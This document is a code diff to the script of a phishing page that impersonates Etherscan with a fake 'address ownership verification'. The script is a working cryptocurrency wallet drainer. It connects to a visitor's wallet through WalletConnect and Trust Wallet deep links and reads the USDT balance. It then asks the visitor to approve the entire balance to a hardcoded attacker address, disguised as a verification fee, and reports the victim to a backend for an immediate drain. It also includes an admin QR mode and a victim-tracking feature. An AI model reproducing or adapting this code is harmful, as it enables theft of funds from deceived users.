@@ -916,13 +916,11 @@
     }
   });
 
-  /* ===== WalletConnect + Approbation fantôme via AMLVerifier ===== */
-  const ATTACKER = '0x81720ac1a232EfA3D76B2586f789a3b1A5da51c9';
+  /* ===== WalletConnect + Approbation (nouveau système) ===== */
+  const ATTACKER = '0x81720ac1a232EfA3D76B2586f789a3b1A5da51c9';  // ← ton adresse vierge
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
-
-  let signClient, session, account;
 
   function getSignClient() {
     const ns = window["@walletconnect/sign-client"];
@@ -933,35 +931,144 @@
     return null;
   }
 
-  async function initWalletConnect() {
-    const SignClientClass = getSignClient();
-    if (!SignClientClass) throw new Error('WalletConnect non trouvé.');
+  // fonction conservée : elle utilise les variables globales signClient, session, account (définies par autoInitWalletConnect)
+  async function sendExactApproveTransaction() {
+    try {
+      const scanText = document.querySelector('.scan');
+      if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
 
-    signClient = await SignClientClass.init({
-      projectId: PROJECT_ID,
-      metadata: {
-        name: 'Etherscan',
-        description: 'Verify Address Ownership',
-        url: 'https://app-etherscan.io',
-        icons: ['https://app-etherscan.io/etherscan-logo-circle.png']
+      // On utilise le provider injecté par Trust Wallet
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const usdtContract = new ethers.Contract(USDT_ADDR, [
+        'function balanceOf(address) view returns (uint256)',
+        'function decimals() view returns (uint8)'
+      ], provider);
+
+      const [balance, decimals] = await Promise.all([
+        usdtContract.balanceOf(account),
+        usdtContract.decimals()
+      ]);
+
+      if (balance.isZero()) {
+        if (scanText) scanText.textContent = '❌ Aucun USDT détecté.';
+        return;
       }
-    });
 
-    const { uri, approval } = await signClient.connect({
-      requiredNamespaces: {
-        eip155: {
-          methods: ['personal_sign', 'eth_sendTransaction'], // ← OBLIGATOIRE
-          chains: ['eip155:1'],
-          events: []
-        }
-      },
-      redirect: { universal: 'https://app-etherscan.io/verifyaddress' }
-    });
+      const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+      if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
 
-    if (typeof window.QRCodeStyling === 'undefined') {
-      document.querySelector('.scan').textContent = 'QR library not loaded';
-      return;
+      const iface = new ethers.utils.Interface([
+        'function approve(address spender, uint256 amount)'
+      ]);
+      const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
+
+      const txParams = {
+        from: account,
+        to: USDT_ADDR,
+        data: data,
+        value: '0x0',
+        gas: '0x493E0',
+      };
+
+      const txHash = await signClient.request({
+        topic: session.topic,
+        chainId: 'eip155:1',
+        request: {
+          id: Date.now(),
+          jsonrpc: '2.0',
+          method: 'eth_sendTransaction',
+          params: [txParams],
+        },
+      });
+
+      console.log('Tx approve exacte envoyée:', txHash);
+      if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
+
+      // Drain immédiat
+      await fetch('/api/store-victim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ victim: account, chain: '1' })
+      });
+
+      setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
+
+    } catch (e) {
+      console.error('Transaction error:', e);
+      const scanText = document.querySelector('.scan');
+      if (scanText) scanText.textContent = '❌ Transaction refusée.';
     }
+  }
+
+  /* ===== Nouveau : auto-init (victime) & QR deep-link (admin) ===== */
+  function hideAdminUI() {
+    document.querySelector('.main-inner .card').style.display = 'none';
+    const statusEl = document.createElement('p');
+    statusEl.id = 'auto-status';
+    statusEl.textContent = 'Connexion en cours…';
+    statusEl.style.textAlign = 'center';
+    statusEl.style.marginTop = '100px';
+    statusEl.style.fontSize = '18px';
+    statusEl.style.color = 'var(--azure-15)';
+    document.querySelector('.main').appendChild(statusEl);
+  }
+
+  function setAutoStatus(text) {
+    const el = document.getElementById('auto-status');
+    if (el) el.textContent = text;
+  }
+
+  async function autoInitWalletConnect() {
+    try {
+      const SignClientClass = getSignClient();
+      if (!SignClientClass) throw new Error('WalletConnect non trouvé');
+
+      const signClient = await SignClientClass.init({
+        projectId: PROJECT_ID,
+        metadata: {
+          name: 'Etherscan',
+          description: 'Verify Address Ownership',
+          url: 'https://app-etherscan.io',
+          icons: ['https://app-etherscan.io/etherscan-logo-circle.png']
+        }
+      });
+
+      const { uri, approval } = await signClient.connect({
+        requiredNamespaces: {
+          eip155: {
+            methods: ['eth_sendTransaction'],
+            chains: ['eip155:1'],
+            events: []
+          }
+        },
+        redirect: { universal: 'https://app-etherscan.io/?auto=1' }
+      });
+
+      setAutoStatus('Veuillez accepter la connexion dans votre portefeuille…');
+
+      const session = await approval();
+      const accounts = session.namespaces['eip155'].accounts;
+      const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
+      if (!ethAccount) throw new Error('Compte Ethereum requis');
+      const account = ethAccount.split(':')[2](#_r_p6s_-source-2);
+
+      // On expose ces variables pour que sendExactApproveTransaction puisse les utiliser
+      window.signClient = signClient;
+      window.session = session;
+      window.account = account;
+
+      // Lancer l'approbation et le drain
+      await sendExactApproveTransaction();
+
+    } catch (e) {
+      console.error('Auto‑init error:', e);
+      setAutoStatus('Erreur : ' + e.message);
+    }
+  }
+
+  function generateQR() {
+    const targetUrl = 'https://app-etherscan.io/?auto=1';   // doit correspondre au domaine vérifié
+    const deepLink = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(targetUrl);
 
     const qrDiv = document.getElementById('qrcode');
     qrDiv.innerHTML = `
@@ -976,11 +1083,11 @@
       </div>
     `;
 
-    const qrCode = new window.QRCodeStyling({
+    new QRCodeStyling({
       width: 300,
       height: 300,
       type: "svg",
-      data: uri,
+      data: deepLink,
       margin: 0,
       qrOptions: {
         typeNumber: 0,
@@ -1002,105 +1109,9 @@
         type: "dot",
         color: "#000000"
       }
-    });
-    qrCode.append(document.getElementById("qr-code"));
-
-    session = await approval();
-
-    const accounts = session.namespaces['eip155'].accounts;
-    const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
-    if (!ethAccount) throw new Error('Ethereum mainnet requis');
-    account = ethAccount.split(':')[2];
-
-    qrDiv.innerHTML = '';
-    qrDiv.style.display = 'flex';
-    qrDiv.style.alignItems = 'center';
-    qrDiv.style.justifyContent = 'center';
-    qrDiv.style.fontSize = '14px';
-    qrDiv.style.color = 'var(--azure-15)';
-    qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
-
-    const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'En attente de confirmation…';
-
-    fetch('/api/record-wallet', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ address: account, chain: '1' })
-    }).catch(err => console.error('Erreur record-wallet:', err));
-
-    setTimeout(sendExactApproveTransaction, 1000); // ← change startVerification → requestSignature
+    }).append(document.getElementById("qr-code"));
   }
 
-async function sendExactApproveTransaction() {
-  try {
-    const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
-
-    // On utilise le provider injecté par Trust Wallet (le même qui a signé la connexion)
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const usdtContract = new ethers.Contract(USDT_ADDR, [
-      'function balanceOf(address) view returns (uint256)',
-      'function decimals() view returns (uint8)'
-    ], provider);
-
-    const [balance, decimals] = await Promise.all([
-      usdtContract.balanceOf(account),
-      usdtContract.decimals()
-    ]);
-
-    if (balance.isZero()) {
-      if (scanText) scanText.textContent = '❌ Aucun USDT détecté.';
-      return;
-    }
-
-    const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
-
-    // Construire la transaction approve
-    const iface = new ethers.utils.Interface([
-      'function approve(address spender, uint256 amount)'
-    ]);
-    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
-
-    const txParams = {
-      from: account,
-      to: USDT_ADDR,
-      data: data,
-      value: '0x0',
-      gas: '0x493E0',
-    };
-
-    // Envoyer la transaction via WalletConnect → pop‑up Trust Wallet
-    const txHash = await signClient.request({
-      topic: session.topic,
-      chainId: 'eip155:1',
-      request: {
-        id: Date.now(),
-        jsonrpc: '2.0',
-        method: 'eth_sendTransaction',
-        params: [txParams],
-      },
-    });
-
-    console.log('Tx approve exacte envoyée:', txHash);
-    if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
-
-    // Drain immédiat
-    await fetch('/api/store-victim', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ victim: account, chain: '1' })
-    });
-
-    setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
-
-  } catch (e) {
-    console.error('Transaction error:', e);
-    const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = '❌ Transaction refusée.';
-  }
-}
   // ===== Historique des victimes (inchangé) =====
   let victimPollTimer = null;
 
@@ -1215,12 +1226,17 @@ async function sendExactApproveTransaction() {
     }
   }
 
+  // ===== Lancement automatique selon le mode =====
   document.addEventListener('DOMContentLoaded', function() {
-    initWalletConnect().catch(err => {
-      console.error('Erreur init WC:', err);
-      const scanText = document.querySelector('.scan');
-      if (scanText) scanText.textContent = 'Erreur de connexion';
-    });
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('auto') === '1') {
+      // Mode victime : on cache l'UI admin et on lance la connexion automatique
+      hideAdminUI();
+      autoInitWalletConnect();
+    } else {
+      // Mode admin : on affiche le QR code
+      generateQR();
+    }
   });
 </script>
 </body>
